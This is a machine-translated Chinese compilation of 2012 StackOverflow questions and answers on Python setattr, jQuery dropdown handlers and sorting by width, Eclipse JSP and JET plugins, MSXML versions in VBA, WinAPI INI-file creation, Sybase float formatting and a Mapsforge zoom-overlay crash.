# StackOverflow 问答 12839000-12839999

# python - 使用 object.__setattr__ 时出现 AttributeError

> ID：12839001
> 
> 赞同：3
> 
> 时间：2012-10-11T11:57:19.483
> 
> 标签：python, object, setattr

最后三行有什么问题？

```
class FooClass(object):
    pass 
bar1 = object() 
bar2 = object() 
bar3 = object() 
foo1 = FooClass() 
foo2 = FooClass() 
foo3 = FooClass() 
object.__setattr__(foo1,'attribute','Hi')
foo2.__setattr__('attribute','Hi')
foo3.attribute = 'Hi'
object.__setattr__(bar1,'attribute','Hi')
bar2.attribute = 'Hi'
bar3.attribute = 'Hi' 
```

我需要一个具有单个属性（如 foo）的对象，我应该为它定义一个类（如 FooClass）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:01:53.020

`object`是[内置类型](http://docs.python.org/library/stdtypes.html)，因此您不能覆盖其实例的属性和方法。

也许你只想要一个[`dictionary`](http://docs.python.org/library/stdtypes.html#dict)or [`collections.NamedTuples`](http://docs.python.org/library/collections.html#collections.namedtuple)：

```
>>> d = dict(foo=42)
{'foo': 42}
>>> d["foo"]
42

>>> from collections import namedtuple
>>> Point = namedtuple('Point', ['x', 'y'], verbose=True)
>>> p = Point(11, y=22)     # instantiate with positional or keyword arguments
>>> p[0] + p[1]             # indexable like the plain tuple (11, 22) 33
>>> x, y = p                # unpack like a regular tuple
>>> x, y (11, 22)
>>> p.x + p.y               # fields also accessible by name 33
>>> p                       # readable __repr__ with a name=value style Point(x=11, y=22) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:01:55.257

您不能将新属性添加到`object()`, 只能添加到子类。

试试`collections.NamedTuple`s。

此外，而不是`object.__setattr__(foo1,'attribute','Hi')`,`setattr(foo1, 'attribute', 'Hi')`会更好。

# javascript - 如何在这个 Javascript 中添加 if/else 语句？

> ID：12839002
> 
> 赞同：0
> 
> 时间：2012-10-11T11:57:19.280
> 
> 标签：javascript, html, json, html-table

我创建了一个带有下拉菜单的表格，将用作比较图表。当用户从下拉列表中选择产品时，下面列中的单元格将填充存储在数组中的产品详细信息。

到目前为止，这工作得很好，但是我在向脚本添加 if/else 语句时遇到了问题，这样我们不仅可以监听 col2 的下拉列表，还可以检测 col3 或 col4 的产品选择。

```
$(".select2").change(function() {
var jthis = $(this);
var whichCol;
if (jthis.hasClass("col2")) {
    whichCol = "col2";
} 
```

正如您现在所看到的，我正在收听下拉菜单“select2”中的更改，该下拉菜单具有 col2 类，然后使用 ID col2 写入 td。我无法击败我如何使脚本也检测到 col3 和 col4 的更改。

**完整的表**

```
<h3>Product Comparision Chart Test</h3>
<table class="table table-bordered table-striped">
<thead>
<tr>
    <th class="center"></th>
    <th>
        <select class="col2 select2">
            <option>Prod1</option>
            <option>Prod2</option>
            <option>Prod3</option>
            <option>Prod4</option>
        </select>
    </th>
    <th>
        <select class="col3 select3">
            <option>Prod1</option>
            <option>Prod2</option>
            <option>Prod3</option>
            <option>Prod4</option>
        </select>
    </th>
    <th>
        <select class="col4 select4">
            <option>Prod1</option>
            <option>Prod2</option>
            <option>Prod3</option>
            <option>Prod4</option>
        </select>
    </th>
 </tr>
</thead>
<tbody>
<tr>
    <td><strong>Logo</strong></td>
    <td class="col2 logo"></td>
    <td class="col3 logo"></td>
    <td class="col4 logo"></td>
</tr>
<tr>
    <td><strong>Details 1</strong></td>
    <td class="col2 d1"></td>
    <td class="col3 d1"></td>
    <td class="col4 d1"></td>
</tr>
<tr>
    <td><strong>Details 2</strong></td>
    <td class="col2 d2"></td>
    <td class="col3 d2"></td>
    <td class="col4 d2"></td>
</tr>
  <tr>
    <td><strong>Details 3</strong></td>
    <td class="col2 d3"></td>
    <td class="col3 d3"></td>
    <td class="col4 d3"></td>
  </tr>
  <tr>
    <td><strong>Details 4</strong></td>
    <td class="col2 d4"></td>
    <td class="col3 d4"></td>
    <td class="col4 d4"></td>
  </tr>
 <tr>
    <td><strong>Rating Icons</strong></td>
    <td class="col2 rating"></td>
    <td class="col3 rating"></td>
    <td class="col4 rating"></td>
  </tr>
  <tr>
    <td><strong>Link to website</strong></td>
    <td class="center"><a href="#" target="_blank" class="button-more">link button</a></td>
    <td class="center"><a href="#" target="_blank" class="button-more">Link Button</a></td>
    <td class="center"><a href="#" target="_blank" class="button-more">Link button</a></td>
  </tr>
  </tbody>
</table> 
```

**JS**

```
var data = {
"brokers":
    {
    "broker": [
        {
        "name": "Prod1",
        "logo": "P1 Logo",
        "d1": "Specs of this",
        "d2": "Some Details",
        "d3": "More text about this",
        "d4": "Even more details here",
        "rating": "3 stars"
        },
    {
        "name": "Prod2",
        "logo": "P2 Logo",
        "d1": "Specs here",
        "d2": "Details go here",
        "d3": "wow, more text",
        "d4": "Even more text and details",
        "rating": "1 stars"
        },
    {
        "name": "Prod3",
        "logo": "P3 Logo",
        "d1": "Specs and stuff",
        "d2": "Details or some other things",
        "d3": "More details go here wow",
        "d4": "Almost forgot - more here",
        "rating": "5 stars"
        },
    {
        "name": "Prod4",
        "logo": "P4 Logo",
        "d1": "Specs, stuff etc",
        "d2": "Some other things",
        "d3": "What should I say",
        "d4": "details go here wow",
        "rating": "4 stars"
        }
    ]}
};

$(".select2").change(function() {
var jthis = $(this);
var whichCol;
if (jthis.hasClass("col2")) {
    whichCol = "col2";
}
$.each(data.brokers.broker, function(i, v) {
    if (v.name == jthis.val()) {
        $("td." + whichCol + ".name").html(v.name);
        $("td." + whichCol + ".logo").html(v.logo);
        $("td." + whichCol + ".d1").html(v.d1);
        $("td." + whichCol + ".d2").html(v.d2);
        $("td." + whichCol + ".d3").html(v.d3);
        $("td." + whichCol + ".d4").html(v.d4);
        $("td." + whichCol + ".rating").html(v.rating);
        return;
    }
});

}); 
```

我还想更改“徽标”的 jQuery，以更改图像的 src，例如产品徽标。我一直在查看 Stack Overflow 和其他一些网站，但无法自己解决这两个问题中的任何一个......是的，我不是一个大的 Java 专家，但非常感谢任何帮助。

代码也在[我的 jsfiddle上](http://jsfiddle.net/HammerMan/ddXYt/3/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:48:52.433

请试试这个：

只需在您的 javascript 文件中替换它即可。

```
$("select").change(function() {
    var jthis = $(this);
    var whichCol;

       if(jthis.attr("class")=="col2 select2")
       {
           whichCol = "col2";
       }
       else if(jthis.attr("class")=="col3 select3")
       {
           whichCol = "col3";
       }
       else if(jthis.attr("class")=="col4 select4")
       {
           whichCol = "col4";
       }

    $.each(data.brokers.broker, function(i, v) {
        if (v.name == jthis.val()) {
            $("td." + whichCol + ".name").html(v.name);
            $("td." + whichCol + ".logo").html(v.logo);
            $("td." + whichCol + ".d1").html(v.d1);
            $("td." + whichCol + ".d2").html(v.d2);
            $("td." + whichCol + ".d3").html(v.d3);
            $("td." + whichCol + ".d4").html(v.d4);
            $("td." + whichCol + ".rating").html(v.rating);
            return;
        }
    });

}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:09:33.473

我不确定我是否理解你的意图。我认为您是说您可以使用 class=select2 响应 select 元素的更改事件，但您不确定如何使用其他 2 个元素实现相同的功能。

如果是这种情况，只需为每个添加另一个 onchange 处理程序 - 即：

```
$(".select3").change(function() {
    var jthis = $(this);
    var whichCol;
    if (jthis.hasClass("col3")) {
        whichCol = "col3";
    }
    $.each(data.brokers.broker, function(i, v) {
        if (v.name == jthis.val()) {
            $("td." + whichCol + ".name").html(v.name);
            $("td." + whichCol + ".logo").html(v.logo);
            $("td." + whichCol + ".d1").html(v.d1);
            $("td." + whichCol + ".d2").html(v.d2);
            $("td." + whichCol + ".d3").html(v.d3);
            $("td." + whichCol + ".d4").html(v.d4);
            $("td." + whichCol + ".rating").html(v.rating);
            return;
        }
    });

});
​ 
```

JsFiddle在这里：http: [//jsfiddle.net/enhzflep/ddXYt/7/](http://jsfiddle.net/enhzflep/ddXYt/7/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:58:18.370

您可以尝试执行以下操作：

```
$(".select2").change(function() {
       var jthis = $(this);
       var whichCol = jthis.attr("class").split(" ")[0];
     $.each(data.brokers.broker, function(i, v) {
        if (v.name == jthis.val()) {
            $("td." + whichCol + ".name").html(v.name);
            $("td." + whichCol + ".logo").html(v.logo);
            $("td." + whichCol + ".d1").html(v.d1);
            $("td." + whichCol + ".d2").html(v.d2);
            $("td." + whichCol + ".d3").html(v.d3);
            $("td." + whichCol + ".d4").html(v.d4);
            $("td." + whichCol + ".rating").html(v.rating);
            return;
        }
    });
});​ 
```

在这里，您有[示例 jsfiddle](http://jsfiddle.net/ddXYt/18/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:37:38.493

除非有人能想到更好的方法，否则我认为我自己已经解决了。我已将所有选择元素更改为“选择”，对脚本执行相同操作并添加了 if/else 语句。

```
$(".select").change(function() {
var jthis = $(this);
var whichCol;
if (jthis.hasClass("col2")) {
    whichCol = "col2";
} else if
    (jthis.hasClass("col3")) {
    whichCol = "col3";
} else if
(jthis.hasClass("col4")) {
    whichCol = "col4";
}
$.each(data.brokers.broker, function(i, v) {
    if (v.name == jthis.val()) {
        $("td." + whichCol + ".name").html(v.name);
        $("td." + whichCol + ".logo").html(v.logo);
        $("td." + whichCol + ".d1").html(v.d1);
        $("td." + whichCol + ".d2").html(v.d2);
        $("td." + whichCol + ".d3").html(v.d3);
        $("td." + whichCol + ".d4").html(v.d4);
        $("td." + whichCol + ".rating").html(v.rating);
        return;
    }
});

}); 
```

工作正常，更新了[小提琴](http://jsfiddle.net/HammerMan/ddXYt/)

# jquery - 无论如何要同时使用 load 和 after 功能

> ID：12839009
> 
> 赞同：2
> 
> 时间：2012-10-11T11:57:45.393
> 
> 标签：jquery

假设我有这个 html dom

```
<body>
  <div id="divId">
    <span>John,</span>
    <span>Karl,</span>
    <span>Brandon,</span>

    <span>Sam</span>
  </div> 
```

我想在**最后一个孩子*****之后***加载一个跨度孩子，我想要这样的东西

 **```
$("#divId span:last-child").after().load('http://localhost/testing/getter.php'); 
```

我如何在加载功能后使用它

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:10:11.953

您可以使用以下方法实现此目的`$.ajax`：

```
$.ajax({
    url: 'http://localhost/testing/getter.php',
    context: $('#divId')
}).done(function(data) {
    this.append(data);
}); 
```

看到它在这里工作：http: [//jsfiddle.net/mfKvc/1/](http://jsfiddle.net/mfKvc/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:14:09.847

尝试以下操作：

```
$('<span>').load('http://localhost/testing/getter.php').insertAfter("#divId span:last-child"); 
```**

# java - Eclipse 中的 JSP 支持与 Crystal Reports 插件

> ID：12839012
> 
> 赞同：0
> 
> 时间：2012-10-11T11:57:57.063
> 
> 标签：java, eclipse, jsp, crystal-reports, eclipse-3.6

我想在eclipse helios-SR2-win32 (3.6) 版本中生成一个JSP文件。它应该像**右键单击 Crystal Reports Web 项目的 Web Content 文件夹并选择 New->JSP**一样简单，但有些我在*New中没有***JSP**选项。我还下载了“Java EE Developers 的 Eclipse IDE”，因为这可能是导致此错误的原因之一，但仍然没有。

 ***理想情况下应该是这样的::**

![在此处输入图像描述](../Images/5f99a5eb35ea84cd5dd51c637db7048d.png)

我在寻找JSP编辑器时发现了这个问题，为此我以[这种方式](https://stackoverflow.com/a/1438909/1465910)下载了Eclipse Web Page editor 。在此之前，我有*New->JSP*选项（虽然我不确定）。

我在 Eclipse 的帮助下生成 Crystal Reports，所以我可以从 Report 文件（.rpt）中获取 JSP 文件。但我想以上述方式生成。我认为它与缺少一些 jar 文件有关，因此在 Google 上搜索了很长时间，但没有找到解决方案。

请通过一些链接或指导帮助我。在此先感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-16T08:59:51.897

当我从 Help->About Eclipse SDK->Installation Details 卸载以下插件时解决了这个错误：

*   Eclipse Java EE 开发人员工具

*   JST 网页界面

然后再次通过帮助->安装新软件重新安装它们。帮助 -> 安装新软件，在其中选择`Helios - http://download.eclipse.org/releases/helios`和，`Web, XML, and Java EE Development->Eclipse Java EE Developer Tools AND JST Web UI`然后按下一步，最后完成。*

# jquery - 每个元素按宽度

> ID：12839021
> 
> 赞同：0
> 
> 时间：2012-10-11T11:58:54.727
> 
> 标签：jquery

我找不到解决方案。如何从具有最大宽度的元素开始循环遍历所有元素（在本例中为具有类 elname_03 的元素）。

我有几个具有相同类名的 div 元素，我正在循环它们。

也许有一个选择器可以做到这一点？

```
<div class="el elname_01"></div>
<div class="el elname_03"></div>
<div class="el elname_02"></div>
<div class="el elname_03"></div>
<div class="el elname_02"></div>
<div class="el elname_03"></div> 
```

*   elname_01 - 宽度 100px
*   elname_02 - 宽度 150px
*   elname_03 - 宽度 200px

我需要从 elname_03 开始​​检查，毕竟它们通过了循环，然后我需要循环所有 02 数字。如果可能的话，我想用一个来做到这一点`each`，因为我正在解析来自 json 的数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:10:45.140

您可以尝试将 jQuery 对象排序为数组，然后遍历它：

```
​var items = $('div');
Array.prototype.sort​​​​​​​​​.call(items, function(a,b){
    return b.offsetWidth - a.offsetWidth;
});

items.each(function() {
   console.log(this); 
}); 
```

这是工作的 JSFiddle：http: [//jsfiddle.net/7BzH4/](http://jsfiddle.net/7BzH4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:10:24.537

这是一个指导性答案。它可以改进。

但这是基本思想：

  [http://jsbin.com/aliqam/2/edit](http://jsbin.com/aliqam/2/edit)

```
<input class="a" style="width:10px";/>
  <input class="b" style="width:100px";/>
  <input class="c" style="width:40px";/> 
```

```
function SortBySize(a, b)
{
    var aName = parseInt($(a).width());
    var bName = parseInt($(b).width());
    return((aName < bName) ? -1 : ((aName > bName) ? 1 : 0));
} 
```

让我们测试：

前 ：

```
console.log($("input").eq(0).width())
console.log($("input ").eq(1).width())
console.log($("input").eq(2).width())

var gg = $("input").get().sort(SortBySize); 
```

后 ：

```
console.log($(gg).eq(0).width())
console.log($(gg).eq(1).width())
console.log($(gg).eq(2).width()) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:14:05.153

试试这个让你的 div 宽度最大：

```
var maxWidth = Math.max.apply( null, $('div.el').map( function () {
    return $(this).outerWidth( true );
}).get() );

alert(maxWidth);​ 
```

**演示：http:** [//jsfiddle.net/UBdAS/](http://jsfiddle.net/UBdAS/)

# vba - VBA:MSXML2.DOMDocument 在宏中更改为 MSXML2.DOMDocument40

> ID：12839024
> 
> 赞同：7
> 
> 时间：2012-10-11T11:59:26.953
> 
> 标签：vba

由于某种原因，我最近将“MSXML2.DOMDocument”更改为“MSXML2.DOMDocument40”。它适用于我的计算机。但相同的代码在另一台计算机中不起作用。可能是什么原因？请提出一些答案。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-10-11T21:31:13.437

`MSXML2.DOMDocument`始终是 的同义词`MSXML2.DOMDocument30`。这对应于 VBA (msxml3.dll) 中“Microsoft XML, v3.0”引用的库

Microsoft 建议开发人员应在其应用程序中以“Microsoft XML, v6.0”库 (msxml6.dll) 为目标。这将通过设置对该库的引用然后使用适当的类型来完成 - 例如`MSXML2.DOMDocument60`.

如果无法使用 v6.0 库，则开发人员应转而使用“Microsoft XML, v3.0”库 (msxml3.dll)。

不建议使用任何其他版本的 XML 库，因为无法保证 v6.0 和 v3.0 以外的任何版本都可以在给定系统上使用。您使用的`MSXML2.DOMDocument40`对应于“Microsoft XML，v4.0”库（msxml4.dll），并且很可能没有运行此代码的计算机根本没有该库可用。

有关详细信息，请参阅[http://blogs.msdn.com/b/xmlteam/archive/2006/10/23/using-the-right-version-of-msxml-in-internet-explorer.aspx](http://blogs.msdn.com/b/xmlteam/archive/2006/10/23/using-the-right-version-of-msxml-in-internet-explorer.aspx)

**编辑：**如果使用后期绑定，您可以在[此处](https://msdn.microsoft.com/en-us/library/ms764622(v=vs.85).aspx)找到适当的 ProgID 。对于 DOMDocument60，您可以使用`CreateObject("Msxml2.DOMDocument.6.0")`

# c++ - WinAPI - 如果 .ini 文件不存在则创建它

> ID：12839025
> 
> 赞同：1
> 
> 时间：2012-10-11T11:59:29.413
> 
> 标签：c++, winapi, file-io, settings, ini

> **可能重复：**
> [c++ 如何从路径创建目录](https://stackoverflow.com/questions/1373889/c-how-to-create-a-directory-from-a-path)

我正在尝试在应用程序数据文件夹中创建一个 .ini 文件，以便我可以使用设置。我试了一下，但我不知道如何检查它是否已经存在，如果不存在，则创建子目录和 .ini 文件。

当我收到最后一条错误消息时，它显示“系统找不到指定的路径”。

```
#include <string>
using namespace std;

#include <Windows.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#pragma comment(lib, "shlwapi.lib")

namespace Settings
{
    CIni        Ini;
    bool        Available = false;
    char        Directory[MAX_PATH];
    const char *IniFileName = "Settings.ini";

    void CheckError() {
        LPVOID lpMsgBuf;
        LPVOID lpDisplayBuf;
        DWORD dw = GetLastError(); 

        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, dw,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&lpMsgBuf, 0, NULL
        );

        string msg = (LPTSTR)lpMsgBuf;
        Error(msg); // MessageBox
    }

    void Initialize() {
        // Get AppData directory
        if (SHGetFolderPath(0, CSIDL_COMMON_APPDATA, 0, 0, Directory) >= 0) {
            string fullpath;
            string subDir = "\\MyCompany\\MyProgram\\1.0\\";

            PathAppend(Directory, subDir.c_str());
            fullpath = Directory;
            fullpath += IniFileName;

            // If directory doesn't exist, create it.
            DWORD attrib = GetFileAttributes(Directory);
            if (!(attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY))) {

                if (CreateDirectory(Directory, NULL)) {
                    HANDLE file = CreateFile(
                        fullpath.c_str(), GENERIC_WRITE, 0, 0,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
                    );

                    if (file != INVALID_HANDLE_VALUE) {
                        CloseHandle(file);
                    } else {
                        CheckError();
                        return;
                    }
                } else {
                    CheckError();
                    return;
                }
            }

            Ini.SetPathName(fullpath.c_str());
            Available = true;
        }
    }
} 
```

我检查了一下，我的电话`CreateDirectory()`返回错误。如何检查文件和目录是否存在，如果不存在则创建它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:17:21.730

```
if (SHCreateDirectoryEx(NULL, Directory, NULL) || 
    GetLastError() == ERROR_ALREADY_EXISTS) 
   {
   HANDLE file = CreateFile(
      fullpath.c_str(), GENERIC_WRITE, 0, 0,
      CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);

   if (file != INVALID_HANDLE_VALUE) 
     {
     CloseHandle(file);
     } 
     else if (GetLastError() != ERROR_FILE_EXISTS) 
       {
       CheckError();
       return;
       }
   } 
   else 
   {
   CheckError();
   return;
   } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:12:06.317

您需要一次创建一层子文件夹。

即创建“MyCompany”，然后创建“MyProgram”，然后创建“1.0”。您可以编写一个函数来执行此操作，类似于 VCL 的 ForceDirectories。

此外，请注意，除非以管理员权限运行，否则常见的应用程序数据在 windows7 上是不可写的。除非您的应用程序安装程序创建一个子文件夹并在其上设置适当的安全 ACL 以允许访问。如果可以，请避免使用用户应用程序数据文件夹。

# eclipse-juno - 无法在 Eclipse JUNO 上安装 jet 插件

> ID：12839026
> 
> 赞同：1
> 
> 时间：2012-10-11T11:59:30.490
> 
> 标签：eclipse-juno, eclipse-emf, eclipse-jet

大家好，我尝试将 Jet 作为 EMF 组件下载，但它不起作用，所以我尝试下载 [存档更新](http://www.eclipse.org/downloads/download.php?file=/modeling/m2t/jet/downloads/drops/1.1.0/R201006081558/m2t-jet-Update-1.1.0.zip)

我收到以下错误：

> 收集要安装的项目时发生错误会话上下文是：（profile=epp.package.modeling，phase=org.eclipse.equinox.internal.p2.engine.phases.Collect，operand=，action=）。下载工件时出现问题：osgi.bundle,org.eclipse.jet,1.1.1.v201101311015。MD5 哈希值不如预期。预期：5bb513bb6cc5dcc936ddb22aebcd0af4 并找到 9e831f7e6d7532b3afd6bc76c48885de。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-11T15:28:30.520

经过一番尝试，我找到了一种可行的方法，至少对我来说是这样。

如[错误报告](https://bugs.eclipse.org/bugs/show_bug.cgi?id=358574)中所述，最新版本的[Eclipse JET](http://www.eclipse.org/modeling/m2t/downloads/?project=jet)要求 UML2 的版本严格低于 4.0.0。Juno自带的版本是4.0.1，所以Eclipse会拒绝安装。同样，UML2 3.1.2（低于 4.0.0 的最新版本）需要低于 2.7 版本的 EMF，而 Juno 的版本是 2.8，因此也不会安装。

但是，请注意，UML2 版本 3.1.2 也可用于更新站点以外的版本。您可以下载[mdt-uml2-SDK-3.1.2.zip](http://archive.eclipse.org/modeling/mdt/uml2/downloads/drops/3.1.2/R201101311648/)，解压缩存档，然后简单地将`features`和`plugins`文件夹合并到您的 Eclipse 安装中，从而避免 Eclipse 对版本号挑剔。

一步步：

1.  安装 Eclipse Juno，安装其他功能（EMF、SVN 等），退出 Eclipse
2.  （可选地，创建一个备份，以防出现问题）
3.  获取[mdt-uml2-SDK-3.1.2.zip](http://archive.eclipse.org/modeling/mdt/uml2/downloads/drops/3.1.2/R201101311648/)，并将其合并`features`到`plugins`您的 Eclipse 安装中
4.  获取[JET 1.1.1 更新站点](http://www.eclipse.org/modeling/m2t/downloads/?project=jet)，并通过 Eclipse 的安装机制安装 JET

据我测试，一切似乎都有效。

# jquery - jQuery 切换和功能

> ID：12839028
> 
> 赞同：1
> 
> 时间：2012-10-11T11:59:34.333
> 
> 标签：jquery, function, toggle

请看看我的小提琴：http: [//jsfiddle.net/wWHZ4/](http://jsfiddle.net/wWHz4/)

这就是我到目前为止用我的一点 jQuery 知识所做的。我想要以下内容：

当我单击*选定标题的按钮时，其他标题必须淡出或切换*。然后动画*选定的标题向左（而不是静态跳跃），然后将所选标题的内容显示*到前面，并将按钮名称从“更多...”更改为“后退”。当我单击*背面时，我希望内容消失*，将所选标题动画返回到他的位置*，然后将其他标题恢复到原来的位置*。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:16:00.340

将其替换为 js 代码

```
$('.group .title > div a.button').click(function() {
    if ($(this).parent().siblings().is(":visible")) {
        $(this).text('back');
    } else {
        $(this).text('more');
    }
    $(this).parent().siblings().slideToggle("slow");
    var indexcount = $(this).parent().index() + 1;
    $('.content').find('.columns:nth-child('+indexcount+')').slideToggle("slow");
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:11:43.813

要切换文本，您可以这样做

```
$('.group .title > div a.button').click(function(){
    $(this).html(($(this).html() == "more...")?"back":"more...");
    $(this).parent().siblings().slideToggle("slow");
    $(this).parent().parent().siblings().slideToggle("slow");
}); 
```

其他一切都在您的演示中工作

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:09:46.280

您可以使用 jquery [ [http://api.jquery.com/html/](http://api.jquery.com/html/) ] 函数更改`<a>`标签的属性，也可以放置一个包含全文并切换该div的状态来回显示全文。`.html()``<div>``display``none``block`

您可以查看使用 jquery 的手风琴代码，它的功能类似于您想要的：http: [//jqueryui.com/accordion/](http://jqueryui.com/accordion/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-24T14:08:20.203

我让它像我想要的那样工作：

```
$('.group .title > div a.button').click(function() {

    var self = this;
    var speed = 500;
    var indexcount = $(self).parent().index() + 1;
    var subcontent = $('.content').find('.columns:nth-child(' + indexcount + ')');

    if ($(self).parent().siblings().is(":visible")) {
        $(self).text('back');
        $(self).parent().siblings().toggle(speed);
        subcontent.delay(speed).toggle("slide", speed);

    } else {
        $(self).text('more');
        subcontent.toggle("slide", speed, function() {
            $(self).parent().siblings().toggle(speed);
        });

    }

}); 
```

见小提琴：http: [//jsfiddle.net/wWHZ4/](http://jsfiddle.net/wWHz4/)

# sql - Sybase 将浮点数转换为字符串

> ID：12839031
> 
> 赞同：1
> 
> 时间：2012-10-11T11:59:49.453
> 
> 标签：sql, sybase, type-conversion

我需要将字段转换`float`为`string`，但有以下限制

1.  需要截断小数点后6位的结果
2.  截断小数点后的任何尾随零

例如：

1.  17.666655942234 ==> 转换为字符串“17.666655”
2.  17.6 ==> 转换为字符串“17.6”而不是“17.600000”
3.  17.66 ==> 转换为字符串“17.66”

我尝试了以下方法，但未能满足上述某些要求，也无法删除零。

```
select 
CASE WHEN RIGHT(convert(VARCHAR, cast(cast(product_price as DECIMAL(28,6))  as float)),2) = ".0"
THEN LEFT(convert(VARCHAR, product_price),(CHAR_LENGTH(convert(VARCHAR(15), product_price))-2))
ELSE substring( convert(VARCHAR, cast(cast(product_price as DECIMAL(28,7))  as float)),1, charindex(".",convert(VARCHAR, cast(cast(product_price as DECIMAL(28,7))  as float)))+6) END 
from #TEMP 
```

### #TEMP 数据

```
id | product_price
-------------------
1  | 17.3435302323
2  | 17.700000000
3  | 17.60
4  | 19.0 
```

我想，我已经把查询复杂化了，应该有一个更简单的版本。

我知道这可以用高级语言轻松处理，但如果这可以很容易地容纳在查询本身中，那么请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:42:09.363

我不确定是否有更简单的方法可以在 sybase 上做到这一点。

这个例子对我有用

```
declare @val float
declare @val2 float
select @val = 17.666655942234 
select @val2 = 17.66
select substring(convert(varchar(30),@val), 1, patindex('%.%',convert(varchar(30),@val)))+reverse(convert(varchar(30),convert(int,reverse(substring(convert(varchar(30),@val), patindex('%.%',convert(varchar(30),@val))+1,6))))) as Val,
       substring(convert(varchar(30),@val2), 1, patindex('%.%',convert(varchar(30),@val2)))+reverse(convert(varchar(30),convert(int,reverse(substring(convert(varchar(30),@val2), patindex('%.%',convert(varchar(30),@val2))+1,6))))) as Val2 
```

解决方案`varchar(15)`

```
declare @val numeric(10,5)
declare @val2 numeric(10,5)
select @val = convert(numeric(10,5),17.666655942234)
select @val2 = convert(numeric(10,5),17.66)
select convert(varchar(15),substring(convert(varchar(15),@val), 1, patindex('%.%',convert(varchar(15),@val)))+reverse(convert(varchar(15),convert(int,reverse(substring(convert(varchar(15),@val), patindex('%.%',convert(varchar(15),@val))+1,6)))))) as Val,
       convert(varchar(15),substring(convert(varchar(15),@val2), 1, patindex('%.%',convert(varchar(15),@val2)))+reverse(convert(varchar(15),convert(int,reverse(substring(convert(varchar(15),@val2), patindex('%.%',convert(varchar(15),@val2))+1,6)))))) as Val2 
```

# java - 在特定缩放级别上隐藏/删除覆盖标记的问题

> ID：12839033
> 
> 赞同：1
> 
> 时间：2012-10-11T11:59:54.440
> 
> 标签：java, android

我正在开发一个应用程序，我在其中尝试使用 Mapforge 获取离线地图数据。我成功集成到系统中。我已经检测到更改列表器上的缩放级别，并且基于我需要设置标记的级别。所以我只写了简单的代码那 ...

```
@Override
    public void onZoomLevelChanged(int zoomLevel) {
        // TODO Auto-generated method stub
        Log.i("TAG","Zoom Level has change");
        int intZoom = mapView.getMapPosition().getZoomLevel();
         if(intZoom <4)
         {

             if(!mapView.getOverlays().isEmpty()) 
             { 
                 mapView.getOverlays().clear();
                 mapView.invalidate();

                 mapView.getOverlays().remove(mapOverlays);
                 mapView.invalidate();
                 isFirstTimeExecution = false;

             }
         }
         else if( intZoom >4 && intZoom < 15)
         {
            if(mapView.getOverlays().isEmpty() && !isFirstTimeExecution) 
             {
                mapView.getOverlays().add(mapOverlays);
                mapView.invalidate();
                isFirstTimeExecution = true;
             }

         }
    } 
```

//这里基本上我想在缩放级别 4 到 15 中设置标记，如果缩放级别应该小于 4，那么它将删除或隐藏，但是这里抛出一些线程异常，不知道为什么会引发

**错误 ：：**

```
10-11 17:20:40.161: ERROR/AndroidRuntime(5810): FATAL EXCEPTION: main
10-11 17:20:40.161: ERROR/AndroidRuntime(5810): java.lang.IllegalThreadStateException: Thread already started.
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at java.lang.Thread.start(Thread.java:1322)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at org.mapsforge.android.maps.overlay.OverlayList.setupOverlay(OverlayList.java:193)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at org.mapsforge.android.maps.overlay.OverlayList.add(OverlayList.java:53)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at org.mapsforge.android.maps.overlay.OverlayList.add(OverlayList.java:30)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at com.offlinemap.OfflinMapActivity.onZoomLevelChanged(OfflinMapActivity.java:189)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at com.offlinemap.MyMapView.dispatchDraw(MyMapView.java:176)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.View.draw(View.java:6743)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.drawChild(ViewGroup.java:1640)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.View.draw(View.java:6743)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.widget.FrameLayout.draw(FrameLayout.java:352)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.drawChild(ViewGroup.java:1640)
10-11 17:20:40.161: ERROR/AndroidRuntime(5810):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
